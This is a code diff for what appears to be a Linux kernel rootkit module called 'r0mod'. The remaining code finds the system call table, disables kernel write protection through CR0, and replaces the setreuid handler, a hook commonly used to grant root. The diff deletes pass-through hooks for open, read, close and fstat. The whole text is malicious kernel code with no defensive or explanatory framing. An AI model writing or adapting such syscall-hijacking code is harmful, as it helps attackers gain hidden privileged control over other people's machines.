@@ -30,30 +30,6 @@ asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
     return orig_setreuid(ruid, euid);
 }
 
-asmlinkage int (*orig_open)(const char *pathname, int flags);
-asmlinkage int new_open(const char *pathname, int flags)
-{
-    return orig_open(pathname, flags);
-}
-
-asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t count);
-asmlinkage ssize_t new_read(int fd, void *buf, size_t count)
-{
-    return orig_read(fd, buf, count);
-}
-
-asmlinkage int (*orig_close)(int fd);
-asmlinkage int new_close(int fd)
-{
-    return orig_close(fd);
-}
-
-asmlinkage int (*orig_fstat)(int fd, struct stat *buf);
-asmlinkage int new_fstat(int fd, struct stat *buf)
-{
-    return orig_fstat(fd, buf);
-}
-
 unsigned long *find_sys_call_table(void)
 {
     unsigned long i;
@@ -97,18 +73,6 @@ static int __init r0mod_init(void)
     orig_setreuid = (void *)syscall_table[__NR_setreuid];
     syscall_table[__NR_setreuid] = (unsigned long)new_setreuid;
 
-    orig_open  = (void *)syscall_table[__NR_open];
-    syscall_table[__NR_open] = (unsigned long)new_open;
-
-    orig_close = (void *)syscall_table[__NR_close];
-    syscall_table[__NR_close] = (unsigned long)new_close;
-
-    orig_read  = (void *)syscall_table[__NR_read];
-    syscall_table[__NR_read] = (unsigned long)new_read;
-
-    orig_fstat = (void *)syscall_table[__NR_fstat];
-    syscall_table[__NR_fstat] = (unsigned long)new_fstat;
-
     write_cr0(read_cr0() | 0x10000);
 
     return 0;
@@ -124,10 +88,6 @@ static void __exit r0mod_exit(void)
         write_cr0(read_cr0() & (~0x10000));
 
         syscall_table[__NR_setreuid] = (unsigned long)orig_setreuid;
-        syscall_table[__NR_open] = (unsigned long)orig_open;
-        syscall_table[__NR_close] = (unsigned long)orig_close;
-        syscall_table[__NR_read] = (unsigned long)orig_read;
-        syscall_table[__NR_fstat] = (unsigned long)orig_fstat;
 
         write_cr0(read_cr0() | 0x10000);
     }
